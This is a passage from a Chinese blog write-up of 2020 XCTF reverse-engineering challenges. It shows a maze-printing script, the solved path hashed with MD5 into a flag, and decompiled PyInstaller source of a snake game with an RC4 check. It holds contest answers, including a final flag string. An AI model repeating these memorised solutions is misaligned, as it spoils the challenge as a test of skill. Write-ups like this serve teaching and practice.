class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">if</span> aMap[i*<span class="number">15</span>+j]==<span class="number">0</span>:</span><br><span class="line">            tmp=<span class="string">&#x27;*&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> aMap[i*<span class="number">15</span>+j]==<span class="number">1</span>:</span><br><span class="line">            tmp=<span class="string">&#x27;.&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> aMap[i*<span class="number">15</span>+j]==<span class="number">3</span>:</span><br><span class="line">            tmp=<span class="string">&#x27;@&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp=<span class="string">&#x27;#&#x27;</span></span><br><span class="line">        print(tmp,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print()</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">14</span> <span class="keyword">or</span> i==<span class="number">29</span>:</span><br><span class="line">        print()</span><br></pre></td></tr></table></figure><p>可以看到打印出了三个迷宫，为了看得清楚所以选用几个特定字符打印。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.....**********</span><br><span class="line">.....*@*.******</span><br><span class="line">.....*.*.******</span><br><span class="line">.....*.*.******</span><br><span class="line">.....*.*.....**</span><br><span class="line">.....*.*****.**</span><br><span class="line">.....*.*****.**</span><br><span class="line">.....*.*****..*</span><br><span class="line">.....*........*</span><br><span class="line">.....********#*</span><br><span class="line">...............</span><br><span class="line">...............</span><br><span class="line">...............</span><br><span class="line">...............</span><br><span class="line">...............</span><br><span class="line">#sssssssddddddds</span><br><span class="line"></span><br><span class="line">..*************</span><br><span class="line">..*@*....******</span><br><span class="line">..*.****.******</span><br><span class="line">..*.****.******</span><br><span class="line">..*..***.....**</span><br><span class="line">..*..*******.**</span><br><span class="line">..*..*******.**</span><br><span class="line">..*..*****....*</span><br><span class="line">..*..*****.**.*</span><br><span class="line">..*..*****.****</span><br><span class="line">..*......*.*..*</span><br><span class="line">..*...........*</span><br><span class="line">..***********#*</span><br><span class="line">...............</span><br><span class="line">...............</span><br><span class="line">#ssssssssssdddddddddds</span><br><span class="line"></span><br><span class="line">***************</span><br><span class="line">*@..***********</span><br><span class="line">***.*...*******</span><br><span class="line">***...*.*******</span><br><span class="line">****.**.*******</span><br><span class="line">*..*.**.*******</span><br><span class="line">**...**.*******</span><br><span class="line">*******.*******</span><br><span class="line">*******....****</span><br><span class="line">**********.****</span><br><span class="line">**********.****</span><br><span class="line">**********.****</span><br><span class="line">**********....*</span><br><span class="line">*************.*</span><br><span class="line">*************#*</span><br><span class="line">#ddssddwddssssssdddssssdddss</span><br></pre></td></tr></table></figure><p>走迷宫，然后把路径拼起来，根据提示转md5，get flag。</p><p>（有个疑惑哈，第二个迷宫理论上说就算是最短路也有多解？是题目出锅了还是我哪里看漏了&#x3D; &#x3D;</p><p>（再补一句，题目似乎甚至没要求最短路？？？神奇.jpg</p><p><img src="/p/wpFor-2020XCTF/image-20201229163439245.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s=<span class="string">b&quot;sssssssdddddddsssssssssssddddddddddsddssddwddssssssdddssssdddss&quot;</span></span><br><span class="line">print(<span class="string">&quot;flag&#123;%s&#125;&quot;</span>%hashlib.md5(s).hexdigest())</span><br></pre></td></tr></table></figure><p><strong>flag{999ea6aa6c365ab43eec2a0f0e5968d5}</strong></p><h2 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h2><p>把题目文件拖进ida，搜索字符串能看到</p><p><img src="/p/wpFor-2020XCTF/image-20201229164109092.png"></p><p>猜测是pyinstaller打包的文件。</p><blockquote><p>也就是这个题让我突然发现pyinstaller还能打包成elf的，于是比赛结束以后赶紧把之前总结的解包指南更新了：<a href="https://c10udlnk.top/p/reSkillsOn-Pyinstaller-extracted-to-python/">RE套路 - 关于pyinstaller打包文件的复原 | c10udlnk_Log</a>。</p></blockquote><p>走流程解包，得到python源码。</p><p><img src="/p/wpFor-2020XCTF/image-20201229165610468.png"></p><p>看到这种混淆变量名，果断替换成ida style变量名（。</p><p>放一下源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Warning: this version of Python has problems handling the Python 3 &quot;byte&quot; type in constants properly.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Embedded file name: main.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 257 bytes</span></span><br><span class="line"><span class="keyword">import</span> random, codecs, sys, time, pygame</span><br><span class="line"><span class="keyword">from</span> pygame.<span class="built_in">locals</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line">SCREEN_WIDTH = <span class="number">600</span></span><br><span class="line">SCREEN_HEIGHT = <span class="number">480</span></span><br><span class="line">SIZE = <span class="number">20</span></span><br><span class="line">LINE_WIDTH = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;this is a fake flag&#125;&#x27;</span></span><br><span class="line">SCOPE_X = (<span class="number">0</span>, SCREEN_WIDTH // SIZE - <span class="number">1</span>)</span><br><span class="line">SCOPE_Y = (<span class="number">2</span>, SCREEN_HEIGHT // SIZE - <span class="number">1</span>)</span><br><span class="line">FOOD_STYLE_LIST = [(<span class="number">10</span>, (<span class="number">255</span>, <span class="number">100</span>, <span class="number">100</span>)), (<span class="number">20</span>, (<span class="number">100</span>, <span class="number">255</span>, <span class="number">100</span>)), (<span class="number">30</span>, (<span class="number">100</span>, <span class="number">100</span>, <span class="number">255</span>))]</span><br><span class="line">LIGHT = (<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>)</span><br><span class="line">DARK = (<span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>)</span><br><span class="line">BLACK = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">RED = (<span class="number">200</span>, <span class="number">30</span>, <span class="number">30</span>)</span><br><span class="line">BGCOLOR = (<span class="number">40</span>, <span class="number">40</span>, <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_text</span>(<span class="params">v1, v2, v3, v4, v5, fcolor=(<span class="params"><span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span></span>)</span>):</span></span><br><span class="line">    v6 = v2.render(v5, <span class="literal">True</span>, fcolor)</span><br><span class="line">    v1.blit(v6, (v3, v4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_snake</span>():</span></span><br><span class="line">    v7 = deque()</span><br><span class="line">    v7.append((<span class="number">2</span>, SCOPE_Y[<span class="number">0</span>]))</span><br><span class="line">    v7.append((<span class="number">1</span>, SCOPE_Y[<span class="number">0</span>]))</span><br><span class="line">    v7.append((<span class="number">0</span>, SCOPE_Y[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">return</span> v7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_food</span>(<span class="params">v8</span>):</span></span><br><span class="line">    v9 = random.randint(SCOPE_X[<span class="number">0</span>], SCOPE_X[<span class="number">1</span>])</span><br><span class="line">    v10 = random.randint(SCOPE_Y[<span class="number">0</span>], SCOPE_Y[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">while</span> (v9, v10) <span class="keyword">in</span> v8:</span><br><span class="line">        v9 = random.randint(SCOPE_X[<span class="number">0</span>], SCOPE_X[<span class="number">1</span>])</span><br><span class="line">        v10 = random.randint(SCOPE_Y[<span class="number">0</span>], SCOPE_Y[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">     v9, v10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_food_style</span>():</span></span><br><span class="line">    <span class="keyword">return</span> FOOD_STYLE_LIST[random.randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEFAULT_KEY = <span class="string">u&#x27;Y\xf3\x02\xc3%\x9a\x820\x0b\xbb%\x7f~;\xd2\xdc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4</span>(<span class="params">v11, key=DEFAULT_KEY, skip=<span class="number">1024</span></span>):</span></span><br><span class="line">    v12 = <span class="number">0</span></span><br><span class="line">    v13 = <span class="built_in">bytearray</span>([v14 <span class="keyword">for</span> v14 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)])</span><br><span class="line">    v12 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> v15 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        v12 = (v12 + v13[v15] + <span class="built_in">ord</span>(key[(v15 % <span class="built_in">len</span>(key))])) % <span class="number">256</span></span><br><span class="line">        v16 = v13[v15]</span><br><span class="line">        v17 = v13[v12]</span><br><span class="line">        v13[v15] = v13[v12]</span><br><span class="line">        v13[v12] = v16</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v12 = <span class="number">0</span></span><br><span class="line">        v18 = <span class="number">0</span></span><br><span class="line">        v19 = []</span><br><span class="line">        <span class="keyword">if</span> skip &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> v15 <span class="keyword">in</span> <span class="built_in">range</span>(skip):</span><br><span class="line">                v12 = (v12 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">                v18 = (v18 + v13[v12]) % <span class="number">256</span></span><br><span class="line">                v13[v12], v13[v18] = v13[v18], v13[v12]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> v20 <span class="keyword">in</span> v11:</span><br><span class="line">            v12 = (v12 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            v18 = (v18 + v13[v12]) % <span class="number">256</span></span><br><span class="line">            v13[v12], v13[v18] = v13[v18], v13[v12]</span><br><span class="line">            v21 = v13[((v13[v12] + v13[v18]) % <span class="number">256</span>)]</span><br><span class="line">            v19.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(v20) ^ v21))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(v19)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">v22</span>):</span></span><br><span class="line">    v23 = rc4(v22)</span><br><span class="line">    <span class="keyword">if</span> v23.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>() == <span class="string">&#x27;275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;YOU WIN&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;YOU LOSE&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    pygame.init()</span><br><span class="line">    v24 = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))</span><br><span class="line">    pygame.display.set_caption(<span class="string">u&#x27;\u8d2a\u5403\u86c7&#x27;</span>)</span><br><span class="line">    v25 = pygame.font.SysFont(<span class="string">&#x27;SimHei&#x27;</span>, <span class="number">24</span>)</span><br><span class="line">    v26 = pygame.font.Font(<span class="literal">None</span>, <span class="number">72</span>)</span><br><span class="line">    v27, v28 = v26.size(<span class="string">&#x27;GAME OVER&#x27;</span>)</span><br><span class="line">    v29 = <span class="literal">True</span></span><br><span class="line">    v30 = init_snake()</span><br><span class="line">    v31 = create_food(v30)</span><br><span class="line">    v32 = get_food_style()</span><br><span class="line">    v33 = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    v34 = <span class="literal">True</span></span><br><span class="line">    v35 = <span class="literal">False</span></span><br><span class="line">    v36 = <span class="number">0</span></span><br><span class="line">    v37 = <span class="number">0.5</span></span><br><span class="line">    v38 = v37</span><br><span class="line">    v39 = <span class="literal">None</span></span><br><span class="line">    v41 = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> v40 <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> v40.<span class="built_in">type</span> == QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> v40.<span class="built_in">type</span> == KEYDOWN:</span><br><span class="line">            <span class="keyword">if</span> v40.key == K_RETURN:</span><br><span class="line">                <span class="keyword">if</span> v34:</span><br><span class="line">                    v35 = <span class="literal">True</span></span><br><span class="line">                    v34 = <span class="literal">False</span></span><br><span class="line">                    v29 = <span class="literal">True</span></span><br><span class="line">                    v30 = init_snake()</span><br><span class="line">                    v31 = create_food(v30)</span><br><span class="line">                    v32 = get_food_style()</span><br><span class="line">                    v33 = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">                    v36 = <span class="number">0</span></span><br><span class="line">                    v39 = time.time()</span><br><span class="line">            <span class="keyword">elif</span> v40.key == K_SPACE:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> v34:</span><br><span class="line">                    v41 = <span class="keyword">not</span> v41</span><br><span class="line">            <span class="keyword">elif</span> v40.key <span class="keyword">in</span> (K_w, K_UP):</span><br><span class="line">                <span class="keyword">if</span> v29:</span><br><span class="line">                    v33 = v33[<span class="number">1</span>] <span class="keyword">or</span> (<span class="number">0</span>, <span class="number">-1</span>)</span><br><span class="line">                    v29 = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> v40.key <span class="keyword">in</span> (K_s, K_DOWN):</span><br><span class="line">                <span class="keyword">if</span> v29:</span><br><span class="line">                    v33 = v33[<span class="number">1</span>] <span class="keyword">or</span> (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">                    v29 = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> v40.key <span class="keyword">in</span> (K_a, K_LEFT):</span><br><span class="line">                <span class="keyword">if</span> v29:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> v33[<span class="number">0</span>]:</span><br><span class="line">                        v33 = (<span class="number">-1</span>, <span class="number">0</span>)</span><br><span class="line">                        v29 = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">elif</span> v40.key <span class="keyword">in</span> (K_d, K_RIGHT):</span><br><span class="line">                        <span class="keyword">if</span> v29:</span><br><span class="line">                            <span class="keyword">if</span> <span class="keyword">not</span> v33[<span class="number">0</span>]:</span><br><span class="line">                                v33 = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">                                v29 = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v24.fill(BGCOLOR)</span><br><span class="line">            <span class="keyword">for</span> v42 <span class="keyword">in</span> <span class="built_in">range</span>(SIZE, SCREEN_WIDTH, SIZE):</span><br><span class="line">                pygame.draw.line(v24, BLACK, (v42, SCOPE_Y[<span class="number">0</span>] * SIZE), (v42, SCREEN_HEIGHT), LINE_WIDTH)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> v43 <span class="keyword">in</span> <span class="built_in">range</span>(SCOPE_Y[<span class="number">0</span>] * SIZE, SCREEN_HEIGHT, SIZE):</span><br><span class="line">                    pygame.draw.line(v24, BLACK, (<span class="number">0</span>, v43), (SCREEN_WIDTH, v43), LINE_WIDTH)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    v44 = v34 <span class="keyword">or</span> time.time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> v44 - v39 &gt; v38 <span class="keyword">and</span> <span class="keyword">not</span> v41:</span><br><span class="line">                v29 = <span class="literal">True</span></span><br><span class="line">                v39 = v44</span><br><span class="line">                v45 = (v30[<span class="number">0</span>][<span class="number">0</span>] + v33[<span class="number">0</span>], v30[<span class="number">0</span>][<span class="number">1</span>] + v33[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> v45 == v31:</span><br><span class="line">                    v30.appendleft(v45)</span><br><span class="line">                    v36 += v32[<span class="number">0</span>]</span><br><span class="line">                    v38 = v37 - <span class="number">0.03</span> * (v36 // <span class="number">100</span>)</span><br><span class="line">                    v31 = create_food(v30)</span><br><span class="line">                    v32 = get_food_style()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> SCOPE_X[<span class="number">0</span>] &lt;= v45[<span class="number">0</span>] &lt;= SCOPE_X[<span class="number">1</span>]:</span><br><span class="line">                        <span class="keyword">if</span> SCOPE_Y[<span class="number">0</span>] &lt;= v45[<span class="number">1</span>] &lt;= SCOPE_Y[<span class="number">1</span>]:</span><br><span class="line">                            <span class="keyword">if</span> v45 <span class="keyword">not</span> <span class="keyword">in</span> v30:</span><br><span class="line">                                v30.appendleft(v45)</span><br><span class="line">                                v30.pop()</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                v34 = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> v34:</span><br><span class="line">                        pygame.draw.rect(v24, v32[<span class="number">1</span>], (v31[<span class="number">0</span>] * SIZE, v31[<span class="number">1</span>] * SIZE, SIZE, SIZE), <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">for</span> v46 <span class="keyword">in</span> v30:</span><br><span class="line">                    pygame.draw.rect(v24, DARK, (v46[<span class="number">0</span>] * SIZE + LINE_WIDTH, v46[<span class="number">1</span>] * SIZE + LINE_WIDTH, SIZE - LINE_WIDTH * <span class="number">2</span>, SIZE 